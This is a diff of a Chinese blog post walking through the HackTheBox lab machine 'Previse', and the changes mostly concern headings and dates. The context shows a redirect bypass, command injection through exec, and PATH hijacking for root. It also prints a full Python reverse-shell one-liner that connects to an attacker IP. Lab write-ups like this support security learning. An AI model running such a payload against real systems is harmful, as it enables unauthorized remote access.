@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/e3c542ada4b134e29e534e3081ef9650.png">
 <meta property="article:published_time" content="2021-12-07T05:01:01.000Z">
-<meta property="article:modified_time" content="2022-04-14T10:57:05.671Z">
+<meta property="article:modified_time" content="2022-06-06T12:34:16.660Z">
 <meta property="article:author" content="何语灵">
 <meta property="article:tag" content="HackTheBox">
 <meta name="twitter:card" content="summary_large_image">
@@ -235,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          975 字
+          1k 字
         
       </span>
     
@@ -485,18 +485,18 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2022年4月14日 晚上
+                    本文最后更新于：2022年6月6日 晚上
                   
                 
               </p>
             
             <div class="markdown-body">
               
-              <h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>端口信息：</p>
+              <h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>端口信息：</p>
 <p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905164457889.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905164457889"></p>
 <p>目录扫描：</p>
 <p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905165344774.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905165344774"></p>
-<h2 id="0x02-打靶"><a href="#0x02-打靶" class="headerlink" title="0x02 打靶"></a>0x02 打靶</h2><p>在之前的收集信息中，可以发现有很多存在的页面，但是由于重定向跳回了login.php进行登录验证。</p>
+<h1 id="0x02-打靶"><a href="#0x02-打靶" class="headerlink" title="0x02 打靶"></a>0x02 打靶</h1><p>在之前的收集信息中，可以发现有很多存在的页面，但是由于重定向跳回了login.php进行登录验证。</p>
 <p>我们使用burp可以渲染页面，可以看到很多页面是有有用的信息的。</p>
 <p>账户注册界面：</p>
 <p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905164807598.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905164807598"></p>
@@ -512,11 +512,11 @@
 <p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905170035868.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905170035868"></p>
 <p>之后以该账号登录，访问<code>files.php</code>，就可以将源码下下来了：</p>
 <p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905211300285.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905211300285"></p>
-<h2 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h2><p>在<code>config.php</code>中可以看到数据库连接的凭据：</p>
+<h1 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h1><p>在<code>config.php</code>中可以看到数据库连接的凭据：</p>
 <p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905170618570.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905170618570"></p>
 <p>在<code>conifg.php</code>中可以发现<code>exec</code>函数直接拼接了参数，可以造成命令执行：</p>
 <p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905172453295.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905172453295"></p>
-<h2 id="0x04-继续打靶"><a href="#0x04-继续打靶" class="headerlink" title="0x04 继续打靶"></a>0x04 继续打靶</h2><p>使用简单的命令拼接即可，这里弹个shell：</p>
+<h1 id="0x04-继续打靶"><a href="#0x04-继续打靶" class="headerlink" title="0x04 继续打靶"></a>0x04 继续打靶</h1><p>使用简单的命令拼接即可，这里弹个shell：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.86.131&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure>
 
 
@@ -530,7 +530,7 @@
 <p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905193619471.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905193619471"></p>
 <p>登录成功：</p>
 <p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905194408362.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905194408362"></p>
-<h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><p>使用命令</p>
+<h1 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h1><p>使用命令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure>
 
 <p>可以看到有备份脚本：</p>
@@ -551,6 +551,13 @@
 
 
 <p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905195611062.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905195611062"></p>
+<h1 id="0x06-Summary"><a href="#0x06-Summary" class="headerlink" title="0x06 Summary"></a>0x06 Summary</h1><p>这是一个Easy难度的Linux靶机，主要考察内容如下：</p>
+<ul>
+<li>不合理的302跳转利用</li>
+<li>代码审计</li>
+<li>hashcat爆破密码</li>
+<li>PATH变量劫持</li>
+</ul>
 
               
             </div>
